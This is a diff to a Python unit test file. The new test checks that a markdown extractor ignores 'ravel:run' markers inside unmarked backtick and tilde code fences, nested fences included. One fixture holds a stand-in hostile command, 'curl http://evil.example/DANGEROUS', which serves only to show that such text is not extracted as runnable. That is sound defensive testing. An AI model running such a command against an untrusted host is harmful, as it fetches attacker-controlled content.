@@ -86,9 +86,24 @@ class TestExtractorFailsClosed(unittest.TestCase):
 
     def test_ravel_run_inside_unmarked_fence_is_not_a_marker(self):
         # A `ravel:run` string that lives inside an unmarked code sample must
-        # not be picked up: it is body, not a marker.
-        text = "```\n<!-- ravel:run status=200 -->\necho hi\n```\n"
-        self.assertEqual(extract_blocks(text), [])
+        # not be picked up: it is body, not a marker. This holds for both fence
+        # kinds, and for a tilde sample that wraps a nested backtick fence (the
+        # shape that leaked a runnable `curl` when only backticks were fences).
+        backtick = "```\n<!-- ravel:run status=200 -->\necho hi\n```\n"
+        self.assertEqual(extract_blocks(backtick), [])
+
+        tilde = "~~~\n<!-- ravel:run status=200 -->\necho hi\n~~~\n"
+        self.assertEqual(extract_blocks(tilde), [])
+
+        nested = (
+            "~~~\n"
+            "<!-- ravel:run status=200 -->\n"
+            "```sh\n"
+            "curl http://evil.example/DANGEROUS\n"
+            "```\n"
+            "~~~\n"
+        )
+        self.assertEqual(extract_blocks(nested), [])
 
 
 class TestParseExpectations(unittest.TestCase):
